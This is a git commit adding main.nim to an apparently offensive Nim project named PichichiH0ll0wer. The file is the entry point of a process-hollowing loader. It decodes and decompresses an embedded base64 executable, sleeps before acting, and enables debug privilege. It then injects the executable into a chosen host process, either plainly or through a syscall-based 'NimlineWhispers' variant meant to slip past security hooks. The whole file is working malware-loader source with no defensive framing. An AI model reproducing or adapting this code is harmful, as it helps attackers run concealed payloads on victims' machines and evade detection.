6168861cbb46a7d53ba9d0040ee1ae706d426320
Itay Migdal <itaymigdal9@gmail.com>
2023-04-14 21:23:51 +0300

    moved all nim files to a folder + splited to main.nim and param.nim

---
+++ PichichiH0ll0wer/main.nim
@@ -0,0 +1,40 @@
+# Internal
+import utils
+import params
+# External
+import os
+import winim/inc/windef
+from zip/zlib import uncompress
+
+# Import per module chosen
+when defined(hollowsimple):
+    import hollowsimple
+when defined(hollownimline):
+    import hollowNimlineWhispers
+
+
+proc execute*(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), sleepSeconds: int = 0): bool =
+
+    # Sleep at execution
+    sleep(sleepSeconds * 1000)
+
+    # Decode and decompress PE
+    var compressedPe = decode64(compressedBase64PE, is_bin=true)
+    var peStr = uncompress(compressedPe)
+
+    # Enable debug privilege
+    discard setDebugPrivilege()
+    
+    # Execute module
+    when defined(hollowsimple):
+        return simpleHollow(peStr, cast[LPCSTR](unsafeAddr sponsorCmd[0]))
+    when defined(hollownimline):
+        return nimlineHollow(peStr, cast[LPCSTR](unsafeAddr sponsorCmd[0]))
+
+# Execute
+discard execute(
+    compressedBase64PE = compressedBase64PE, 
+    sponsorCmd = sponsorPath & " " & sponsorParams,
+    sleepSeconds = sleepSeconds
+)
+
